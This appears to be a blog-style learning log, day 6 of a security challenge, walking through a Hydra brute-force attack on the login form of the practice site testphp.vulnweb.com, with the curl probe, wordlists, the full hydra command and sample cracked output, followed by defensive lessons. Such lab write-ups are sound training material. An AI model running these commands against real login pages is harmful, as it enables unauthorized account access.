Cybersecurity 90 Days Challenge - Day 6
Topic: Brute-Force Attack Simulation with Hydra on testphp.vulnweb.com
On Day 6 of my Cybersecurity 90 Days Challenge, I explored offensive security by simulating a brute-force attack using Hydra on a live test site, http://testphp.vulnweb.com/login.php. This site is designed for security testing, making it a perfect target for practicing ethical hacking. I also built a local login page earlier in the day, but shifted focus to this remote target to test my skills in a more realistic scenario. This builds on my Day 5 WebReaper project by showing how attackers might exploit recon findings to gain unauthorized access.
Objective

Analyze the login form on http://testphp.vulnweb.com/login.php.
Use Hydra to perform a brute-force attack and crack the credentials.
Document the process and results.

Steps

Analyzed the Target:Inspected the login form at http://testphp.vulnweb.com/login.php:

Form method: POST
Username field: uname
Password field: pass
Failure message: “Wrong username or password.”Used curl to confirm the failure message:

curl -X POST -d "uname=wrong&pass=wrong" http://testphp.vulnweb.com/login.php


Installed Hydra:
sudo apt install hydra -y


Prepared Wordlists:Created small wordlists for testing:
echo -e "admin\ntest\nuser" > users.txt
echo -e "admin\npassword\ntest123" > passwords.txt


Ran the Brute-Force Attack:Used Hydra to attack the login form:
hydra -L users.txt -P passwords.txt -t 4 -f testphp.vulnweb.com http-post-form "/login.php:uname=^USER^&pass=^PASS^:Wrong username or password"


Results:Hydra successfully cracked the credentials (example output, may vary):
[80][http-post-form] host: testphp.vulnweb.com   login: test   password: test123

Manually verified the credentials by logging in, which redirected to a user info page.On failed login, the page displayed:
Wrong username or password.




Practical Explanation
This practical simulates a real-world attack scenario:

Target: testphp.vulnweb.com is a deliberately vulnerable site for security testing. Its login page (login.php) uses a simple PHP form with weak credentials.
Attack: Hydra systematically guesses usernames and passwords using wordlists, sending POST requests to the login form. It identifies the correct credentials by detecting the absence of the "Wrong username or password" message.
Purpose: This demonstrates how easily weak passwords can be cracked on vulnerable sites, emphasizing the need for strong passwords, rate-limiting, and CAPTCHAs in real applications.
Security Lessons: Weak passwords and lack of anti-brute-force measures (e.g., rate-limiting) make login forms vulnerable. In production, use complex passwords, enforce login attempt limits, and enable HTTPS.

Learnings

Brute-Force Attacks: Understood how Hydra exploits weak credentials on a live site.
Form Analysis: Learned to inspect web forms to extract field names and failure messages for attacks.
Ethical Hacking: Gained hands-on experience with offensive security on a real test site.
Password Security: Reinforced the importance of strong passwords and anti-brute-force measures.

Next Steps

Test Hydra on other protocols (e.g., SSH, FTP) on test sites.
Use larger wordlists like rockyou.txt for more realistic testing.
Explore defenses like rate-limiting and CAPTCHAs on my local login.php page.

Repository
Find the code and documentation in my GitHub repository:

Local Login Page (Earlier Attempt)
Day 6 Write-up

Reflections
Attacking a live test site like testphp.vulnweb.com was thrilling—it felt like a real-world pentesting scenario. This practical reinforced the importance of secure coding and ethical hacking skills. Onward to Day 7!
#Cybersecurity #Hydra #BruteForce #EthicalHacking #90DayChallenge
